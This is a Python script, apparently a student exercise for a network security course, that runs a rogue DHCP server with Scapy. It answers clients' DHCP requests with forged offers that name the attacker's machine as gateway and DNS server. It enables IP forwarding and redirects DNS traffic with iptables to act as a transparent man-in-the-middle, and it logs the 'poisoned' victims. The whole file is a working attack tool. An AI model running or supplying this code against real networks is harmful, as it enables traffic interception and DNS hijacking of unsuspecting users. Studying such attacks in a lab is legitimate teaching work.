#!/usr/bin/env python3
# =============================================================================
# DHCP Spoofing - Rogue DHCP Server (Servidor DHCP Falso) v3
# =============================================================================
# Autor     : Junior Javier Santos Perez
# Matricula : 2024-1599
# Curso     : Seguridad en Redes
# Descripcion: Levanta un servidor DHCP falso que responde antes que el
#              router legítimo. Las víctimas reciben una configuración de
#              red controlada por el atacante: IP, Gateway y DNS falsos.
#              Esta versión asigna IPs ALEATORIAS dentro de la subred
#              configurada, sin necesidad de definir un rango fijo.
#
# Flujo del ataque:
#   1. Cliente conecta → emite DHCP Discover (broadcast)
#   2. Nuestro servidor falso responde con DHCP Offer (más rápido que el real)
#   3. Cliente acepta → envía DHCP Request
#   4. Nosotros confirmamos con DHCP ACK
#   5. Cliente queda configurado con nuestro Gateway y DNS
#
# Red      : 10.0.99.0/24
# Interfaz : eth0
# =============================================================================

from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, conf
)
import os
import sys
import argparse
import random


# =============================================================================
# CONFIGURACIÓN DEL SERVIDOR DHCP FALSO
# =============================================================================
INTERFAZ        = "eth0"

# Datos que le vamos a entregar a cada víctima:
IP_ATACANTE     = "10.0.99.100"   # Nuestra IP (el servidor DHCP falso)
GATEWAY_FALSO   = "10.0.99.100"   # Le decimos que nosotros somos su puerta de enlace
DNS_FALSO       = "10.0.99.100"   # Le decimos que nosotros somos su servidor DNS
MASCARA_RED     = "255.255.255.0"
TIEMPO_LEASE    = 600             # Tiempo en segundos que "dura" la asignación

# Subred de la que se tomarán IPs aleatorias para asignar:
# El script generará IPs random dentro de este rango .1 → .254
# excluyendo la IP del atacante y las ya asignadas.
SUBRED_BASE     = "10.0.99"       # Los tres primeros octetos de la red


# =============================================================================
# ESTADO INTERNO DEL SERVIDOR
# =============================================================================

# Registro de asignaciones: { "aa:bb:cc:dd:ee:ff": "10.0.99.100" }
ips_asignadas = {}

# Contador de estadísticas
stats = {
    "discover":  0,
    "offer":     0,
    "request":   0,
    "ack":       0,
    "clientes":  0,
}

# Pool de IPs (ya no es necesario, usamos asignación aleatoria)
POOL = []


# =============================================================================
# ASIGNACIÓN DE IPs ALEATORIAS
# =============================================================================

def generar_ip_aleatoria():
    """
    Genera una IP aleatoria dentro de la subred configurada (SUBRED_BASE).
    Evita asignar:
      - .0   → dirección de red
      - .255 → broadcast
      - .1   → gateway real (router)
      - La IP del atacante
      - IPs ya asignadas a otros clientes

    Retorna:
        str: IP aleatoria disponible, o None si no hay IPs libres.
    """
    ips_en_uso = set(ips_asignadas.values())
    ips_en_uso.add(IP_ATACANTE)   # No asignar nuestra propia IP
    ips_en_uso.add(f"{SUBRED_BASE}.1")    # No asignar el gateway real
    ips_en_uso.add(f"{SUBRED_BASE}.0")    # No asignar dirección de red
    ips_en_uso.add(f"{SUBRED_BASE}.255")  # No asignar broadcast

    # Intentar hasta 254 veces encontrar una IP libre
    candidatos = list(range(2, 255))
    random.shuffle(candidatos)   # Orden aleatorio

    for ultimo_octeto in candidatos:
        ip_candidata = f"{SUBRED_BASE}.{ultimo_octeto}"
        if ip_candidata not in ips_en_uso:
            return ip_candidata

    print("[!] ADVERTENCIA: No hay IPs disponibles en la subred.")
    return None


def asignar_ip(mac_cliente):
    """
    Retorna la IP asignada a un cliente.
    Si el cliente es nuevo, genera una IP aleatoria disponible.

    Parametros:
        mac_cliente (str): Dirección MAC del cliente.

    Retorna:
        str | None: IP asignada, o None si no hay IPs disponibles.
    """
    # Si ya le asignamos una IP antes, le damos la misma
    if mac_cliente in ips_asignadas:
        return ips_asignadas[mac_cliente]

    # Generar una IP aleatoria disponible
    ip_nueva = generar_ip_aleatoria()
    if ip_nueva:
        ips_asignadas[mac_cliente] = ip_nueva
        stats["clientes"] += 1
    return ip_nueva


# =============================================================================
# CONSTRUCCIÓN DE PAQUETES DHCP
# =============================================================================

def construir_dhcp_offer(mac_cliente, xid):
    """
    Construye un paquete DHCP Offer para responder a un Discover.
    Le ofrecemos una IP al cliente con nuestra configuración de red falsa.

    Estructura del paquete:
        Ethernet → IP → UDP (67 → 68) → BOOTP → DHCP options

    Parametros:
        mac_cliente (str): MAC del cliente que hizo el Discover.
        xid         (int): Transaction ID del paquete original (debe coincidir).

    Retorna:
        Paquete Scapy listo para enviar, o None si no hay IPs disponibles.
    """
    ip_ofrecida = asignar_ip(mac_cliente)
    if not ip_ofrecida:
        return None

    paquete = (
        # Capa 2: enviamos directo al cliente por su MAC
        Ether(dst=mac_cliente) /

        # Capa 3: broadcast porque el cliente aún no tiene IP configurada
        IP(src=IP_ATACANTE, dst="255.255.255.255") /

        # Capa 4: DHCP siempre usa puerto 67 (servidor) → 68 (cliente)
        UDP(sport=67, dport=68) /

        # BOOTP: base del protocolo DHCP
        BOOTP(
            op=2,                   # op=2 → REPLY (servidor hacia cliente)
            yiaddr=ip_ofrecida,     # "Your IP" — la IP que le ofrecemos
            siaddr=IP_ATACANTE,     # IP de nuestro servidor DHCP falso
            chaddr=bytes.fromhex(mac_cliente.replace(":", "")),
            xid=xid                 # Debe coincidir con el xid del Discover
        ) /

        # Opciones DHCP
        DHCP(options=[
            ("message-type", "offer"),      # Tipo: Offer
            ("server_id",    IP_ATACANTE),  # Identificador de nuestro servidor
            ("lease_time",   TIEMPO_LEASE), # Duración de la concesión
            ("subnet_mask",  MASCARA_RED),  # Máscara de red
            ("router",       GATEWAY_FALSO),# ← Gateway falso: todo pasa por nosotros
            ("name_server",  DNS_FALSO),    # ← DNS falso: controlamos las resoluciones
            "end"                           # Fin de opciones (obligatorio en DHCP)
        ])
    )
    return paquete


def construir_dhcp_ack(mac_cliente, ip_solicitada, xid):
    """
    Construye un paquete DHCP ACK para confirmar la asignación.
    Tras este paquete, el cliente aplica la configuración definitivamente.

    Parametros:
        mac_cliente   (str): MAC del cliente.
        ip_solicitada (str): IP que el cliente aceptó de nuestro Offer.
        xid           (int): Transaction ID del paquete Request.

    Retorna:
        Paquete Scapy listo para enviar.
    """
    paquete = (
        Ether(dst=mac_cliente) /
        IP(src=IP_ATACANTE, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=ip_solicitada,
            siaddr=IP_ATACANTE,
            chaddr=bytes.fromhex(mac_cliente.replace(":", "")),
            xid=xid
        ) /
        DHCP(options=[
            ("message-type", "ack"),        # Tipo: ACK — confirmación final
            ("server_id",    IP_ATACANTE),
            ("lease_time",   TIEMPO_LEASE),
            ("subnet_mask",  MASCARA_RED),
            ("router",       GATEWAY_FALSO),
            ("name_server",  DNS_FALSO),
            "end"
        ])
    )
    return paquete


# =============================================================================
# PROCESAMIENTO DE PAQUETES CAPTURADOS
# =============================================================================

def procesar_paquete(paquete):
    """
    Handler principal. Scapy llama a esta función por cada paquete
    capturado en la interfaz. Identifica si es DHCP y actúa:

        Discover (tipo 1) → respondemos con Offer
        Request  (tipo 3) → respondemos con ACK
        Release  (tipo 7) → liberamos la IP del registro

    Parametros:
        paquete: Paquete capturado por sniff().
    """
    # Ignorar paquetes que no sean DHCP
    if not paquete.haslayer(DHCP):
        return

    # Extraer el tipo de mensaje DHCP de las opciones
    tipo_mensaje = None
    for opcion in paquete[DHCP].options:
        if isinstance(opcion, tuple) and opcion[0] == "message-type":
            tipo_mensaje = opcion[1]
            break

    if tipo_mensaje is None:
        return

    mac_cliente = paquete[Ether].src
    xid         = paquete[BOOTP].xid

    # ── DHCP DISCOVER (tipo 1) ────────────────────────────────────────────
    # El cliente busca un servidor DHCP en la red mediante broadcast
    if tipo_mensaje == 1:
        stats["discover"] += 1
        print(f"\n[→] DHCP DISCOVER  desde {mac_cliente}")

        oferta = construir_dhcp_offer(mac_cliente, xid)
        if oferta:
            sendp(oferta, iface=INTERFAZ, verbose=False)
            stats["offer"] += 1
            ip_ofrecida = ips_asignadas.get(mac_cliente, "?")
            print(f"[←] DHCP OFFER     hacia {mac_cliente}  →  IP ofrecida: {ip_ofrecida}")

    # ── DHCP REQUEST (tipo 3) ─────────────────────────────────────────────
    # El cliente acepta nuestra oferta y nos lo confirma
    elif tipo_mensaje == 3:
        stats["request"] += 1

        # Extraer la IP que el cliente está aceptando
        ip_solicitada = None
        for opcion in paquete[DHCP].options:
            if isinstance(opcion, tuple) and opcion[0] == "requested_addr":
                ip_solicitada = opcion[1]
                break

        # Si no viene en las opciones, usamos la que ya le asignamos
        if not ip_solicitada:
            ip_solicitada = ips_asignadas.get(mac_cliente)

        if ip_solicitada:
            print(f"\n[→] DHCP REQUEST   desde {mac_cliente}  solicitando: {ip_solicitada}")
            ack = construir_dhcp_ack(mac_cliente, ip_solicitada, xid)
            sendp(ack, iface=INTERFAZ, verbose=False)
            stats["ack"] += 1
            print(f"[←] DHCP ACK       hacia {mac_cliente}")
            print(f"    ✓ Cliente envenenado:")
            print(f"      IP      : {ip_solicitada}")
            print(f"      Gateway : {GATEWAY_FALSO}  ← (atacante)")
            print(f"      DNS     : {DNS_FALSO}  ← (atacante)")

    # ── DHCP RELEASE (tipo 7) ─────────────────────────────────────────────
    # El cliente libera su IP (se desconecta). La devolvemos al pool.
    elif tipo_mensaje == 7:
        if mac_cliente in ips_asignadas:
            ip_liberada = ips_asignadas.pop(mac_cliente)
            stats["clientes"] -= 1
            print(f"\n[i] DHCP RELEASE   desde {mac_cliente}  liberó: {ip_liberada}")


# =============================================================================
# CONFIGURACIÓN DEL SISTEMA OPERATIVO
# =============================================================================

def activar_ip_forwarding():
    """
    Activa el reenvío de paquetes IP en Linux.
    Sin esto el tráfico de las víctimas llegaría a nosotros
    pero no seguiría hacia internet → conexión cortada, víctima sospecha.
    Con IP Forwarding activado somos un MitM completamente transparente.
    """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # Redirigir consultas DNS al puerto 5353 donde podríamos tener un DNS falso
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353")
    print("[*] IP Forwarding activado.")
    print("[*] Regla iptables: tráfico DNS (53) redirigido a puerto 5353.")


def desactivar_ip_forwarding():
    """
    Revierte todos los cambios al sistema operativo al terminar.
    """
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353")
    print("[*] IP Forwarding desactivado.")
    print("[*] Regla iptables DNS eliminada.")


# =============================================================================
# RESUMEN FINAL
# =============================================================================

def mostrar_resumen():
    """
    Muestra estadísticas completas y lista de clientes afectados al finalizar.
    """
    print("\n" + "=" * 60)
    print("   RESUMEN DEL ATAQUE")
    print("=" * 60)
    print(f"  DHCP Discover recibidos : {stats['discover']}")
    print(f"  DHCP Offer enviados     : {stats['offer']}")
    print(f"  DHCP Request recibidos  : {stats['request']}")
    print(f"  DHCP ACK enviados       : {stats['ack']}")
    print(f"  Clientes afectados      : {stats['clientes']}")
    print("=" * 60)

    if ips_asignadas:
        print("  Clientes con configuración DHCP falsa activa:")
        print(f"  {'MAC':<20}  {'IP Asignada'}")
        print(f"  {'-'*20}  {'-'*15}")
        for mac, ip in ips_asignadas.items():
            print(f"  {mac:<20}  {ip}")
        print()
        print("  Para restaurar config legítima en los clientes:")
        print("  Windows → ipconfig /release && ipconfig /renew")
        print("  Linux   → dhclient -r && dhclient")
    else:
        print("  Ningún cliente quedó afectado.")

    print("=" * 60)


# =============================================================================
# PUNTO DE ENTRADA
# =============================================================================

def main():
    global INTERFAZ, IP_ATACANTE, GATEWAY_FALSO, DNS_FALSO, SUBRED_BASE

    parser = argparse.ArgumentParser(
        description="DHCP Spoofing v3 (IPs Aleatorias) — Junior Javier Santos Perez (2024-1599)"
    )
    parser.add_argument("-i", "--interfaz",
                        default=INTERFAZ,
                        help=f"Interfaz de red (default: {INTERFAZ})")
    parser.add_argument("-a", "--atacante",
                        default=IP_ATACANTE,
                        help=f"IP del atacante / servidor DHCP falso (default: {IP_ATACANTE})")
    parser.add_argument("-g", "--gateway",
                        default=GATEWAY_FALSO,
                        help=f"Gateway falso a entregar a las víctimas (default: {GATEWAY_FALSO})")
    parser.add_argument("-d", "--dns",
                        default=DNS_FALSO,
                        help=f"DNS falso a entregar a las víctimas (default: {DNS_FALSO})")
    parser.add_argument("-s", "--subred",
                        default=SUBRED_BASE,
                        help=f"Primeros 3 octetos de la subred (default: {SUBRED_BASE})")
    args = parser.parse_args()

    # Aplicar argumentos
    INTERFAZ      = args.interfaz
    IP_ATACANTE   = args.atacante
    GATEWAY_FALSO = args.gateway
    DNS_FALSO     = args.dns
    SUBRED_BASE   = args.subred

    # Verificar permisos root
    if os.geteuid() != 0:
        print("[ERROR] Este script requiere permisos de administrador.")
        print("        Ejecuta con: sudo python3 dhcp_spoofing_v3.py")
        sys.exit(1)

    # Silenciar salida verbose de Scapy
    conf.verb = 0

    # ── Header de consola ────────────────────────────────────────────────
    print("=" * 60)
    print("   DHCP SPOOFING — ROGUE DHCP SERVER v3")
    print("   Autor    : Junior Javier Santos Perez")
    print("   Matricula: 2024-1599")
    print("=" * 60)
    print(f"  Interfaz       : {INTERFAZ}")
    print(f"  Servidor falso : {IP_ATACANTE}")
    print(f"  Gateway falso  : {GATEWAY_FALSO}")
    print(f"  DNS falso      : {DNS_FALSO}")
    print(f"  Subred         : {SUBRED_BASE}.0/24")
    print(f"  IPs asignables : {SUBRED_BASE}.2 → {SUBRED_BASE}.254 (aleatorias)")
    print(f"  Tiempo lease   : {TIEMPO_LEASE}s")
    print("=" * 60)

    # Activar IP Forwarding y reglas de red
    activar_ip_forwarding()

    print("\n[*] Servidor DHCP falso activo. Esperando clientes...")
    print("[*] Presiona Ctrl+C para detener.\n")

    try:
        sniff(
            iface=INTERFAZ,
            filter="udp and (port 67 or port 68)",
            prn=procesar_paquete,
            store=False
        )

    except KeyboardInterrupt:
        print("\n\n[!] Ataque interrumpido.")
        desactivar_ip_forwarding()
        mostrar_resumen()
        print("[*] Ataque finalizado.")


if __name__ == "__main__":
    main()
